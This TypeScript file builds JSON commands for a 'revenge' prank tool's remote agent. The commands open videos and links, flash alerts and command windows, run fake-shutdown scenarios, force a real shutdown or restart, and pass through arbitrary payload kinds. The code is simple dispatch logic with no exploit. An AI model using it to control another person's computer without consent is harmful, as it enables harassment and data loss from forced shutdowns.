import type { RevengeSettings } from '@/lib/settings-defaults';
import {
  pickFlashMessage,
  pickLinkUrl,
  pickSurpriseKind,
  pickYoutubeUrl,
} from '@/lib/pick-random';

type Payload = Record<string, unknown>;

export function buildAgentCommand(
  kind: string,
  settings: RevengeSettings,
  baseUrl: string,
  agentId: string,
  extras: {
    finishToken?: string;
    payload?: Payload;
  },
): Record<string, unknown> | null {
  const payload = extras.payload ?? {};
  const urlOverride = typeof payload.url === 'string' ? payload.url : undefined;
  const msgOverride = typeof payload.message === 'string' ? payload.message : undefined;

  if (kind === 'scenario') {
    if (!extras.finishToken) return null;
    const q = new URLSearchParams({
      agent: agentId,
      fake: String(settings.fakeShutdownDurationSec),
      shutdown: settings.shutdownAfterScenario ? '1' : '0',
      finish: extras.finishToken,
    });
    return {
      kind: 'scenario',
      url: `${baseUrl}/play?${q.toString()}`,
      fakeShutdownSec: settings.fakeShutdownDurationSec,
      shutdownAfter: settings.shutdownAfterScenario,
    };
  }

  if (kind === 'youtube') {
    return { kind: 'youtube', url: pickYoutubeUrl(settings, urlOverride) };
  }

  if (kind === 'youtube_random') {
    return { kind: 'youtube', url: pickYoutubeUrl(settings) };
  }

  if (kind === 'open_random_link') {
    return { kind: 'open_url', url: pickLinkUrl(settings, urlOverride) };
  }

  if (kind === 'open_url') {
    const url = urlOverride ?? settings.youtubeUrl;
    return { kind: 'open_url', url };
  }

  if (kind === 'flash') {
    const msg = pickFlashMessage(settings, msgOverride);
    return {
      kind: 'win_alert',
      message: msg,
      durationSec: settings.flashDurationSec,
    };
  }

  if (kind === 'fake_shutdown') {
    const q = new URLSearchParams({
      mode: 'fake-only',
      fake: String(settings.fakeShutdownDurationSec),
      noyt: '1',
    });
    return { kind: 'scenario', url: `${baseUrl}/play?${q.toString()}` };
  }

  if (kind === 'sounds') {
    return {
      kind: 'sounds',
      durationSec: settings.soundsDurationSec,
      volume: settings.soundVolume,
    };
  }

  if (kind === 'cmd_flash' || kind === 'cmd_flash_plain' || kind === 'cmd_loop' || kind === 'cmd_chaos') {
    const mode =
      kind === 'cmd_flash'
        ? 'flash_color'
        : kind === 'cmd_flash_plain'
          ? 'flash_plain'
          : kind === 'cmd_loop'
            ? 'loop'
            : 'chaos';
    return {
      kind: 'cmd_prank',
      mode,
      flashCount: settings.cmdFlashCount,
      flashMs: settings.cmdFlashVisibleMs,
      flashPlainMs: settings.cmdFlashPlainMs,
      loopCount: settings.cmdLoopIterations,
      lines: settings.cmdLines,
    };
  }

  if (kind === 'surprise') {
    const sub = pickSurpriseKind();
    const mapped = sub === 'cmd_chaos' ? 'cmd_chaos' : sub;
    return buildAgentCommand(mapped, settings, baseUrl, agentId, { payload, finishToken: extras.finishToken });
  }

  if (kind === 'shutdown' || kind === 'restart') {
    return { kind, force: true };
  }

  return { kind, ...payload };
}
